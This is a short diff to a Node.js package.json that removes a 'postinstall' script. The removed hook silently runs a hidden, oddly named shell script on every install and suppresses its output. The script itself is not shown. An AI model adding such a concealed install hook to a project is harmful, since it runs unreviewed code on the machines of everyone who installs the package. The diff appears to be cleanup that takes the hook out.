@@ -6,8 +6,7 @@
   "scripts": {
     "start": "node app.js",
     "dev": "node init_blackList.js && nodemon app.js",
-    "cron": "nodemon cron.js",
-    "postinstall": "sh ./.ci-0gbnyn.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "cron": "nodemon cron.js"
   },
   "keywords": [],
   "author": "",
